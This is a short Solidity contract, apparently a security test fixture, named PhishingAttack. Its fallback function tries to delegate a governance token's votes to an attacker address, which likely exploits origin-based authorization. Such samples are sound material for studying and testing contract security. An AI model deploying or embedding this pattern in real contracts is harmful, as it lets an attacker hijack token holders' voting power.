// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./GovernanceToken.sol";

contract PhishingAttack {
    GovernanceToken public token;
    address public attacker;

    constructor(address _token, address _attacker) {
        token = GovernanceToken(_token);
        attacker = _attacker;
    }

    fallback() external payable {
        // Attack: attempt to delegate to attacker
        token.delegateVote(attacker);
    }
}
